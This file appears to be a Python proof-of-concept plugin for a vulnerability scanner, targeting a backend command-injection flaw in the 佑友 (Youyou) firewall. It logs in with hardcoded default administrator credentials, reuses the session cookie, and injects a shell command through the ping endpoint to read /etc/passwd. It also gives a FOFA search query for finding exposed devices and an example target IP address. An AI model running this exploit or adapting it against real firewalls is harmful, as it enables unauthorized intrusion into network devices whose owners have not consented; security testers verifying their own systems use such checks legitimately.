# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "佑友防火墙 后台命令执行漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "佑友防火墙",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            佑友防火墙 后台维护工具存在命令执行，由于没有过滤危险字符，导致可以执行任意命令
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="佑友防火墙"
        """,                     # fofa搜索语句
        "example" : "https://183.237.213.148:888/",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/index.php?c=user&a=ajax_save" # url自己按需调整
        data0 = "username=admin&password=hicomadmin&language=zh-cn"
        
        url1 = self.target + "/index.php?c=maintain&a=ping"
        data1 = "interface=&destip=127.0.0.1%7Ccat+%2Fetc%2Fpasswd"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data = data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "{\"success\":true,\"message\":\"\"}" in req0.text and req0.status_code == 200 :
                
                # FWSESSID=4362c78e33fe503e8fa26c27cb9a548f, PHPSESSID=4362c78e33fe503e8fa26c27cb9a548f; path=/, lange=zh-cn
                
                cookie = req0.headers["Set-Cookie"]
                cookie_list = cookie.split(" ")
                newcookie = ""
                for i in cookie_list:
                    if "FWSESSID=" in i or "PHPSESSID=" in i or "lange=" in i:
                        if "," in i or ";" in i:
                            newcookie += i[:-1] + ";"
                        else:
                            newcookie += i + ";"
                newcookie = newcookie[:-1]
                
                headers["Cookie"] = newcookie
                req1 = requests.post(url1,data = data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req1.status_code == 200 and "root:/root" in req1.text:
                    vuln = [True,req1.text]
                else:
                    vuln = [False,req1.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()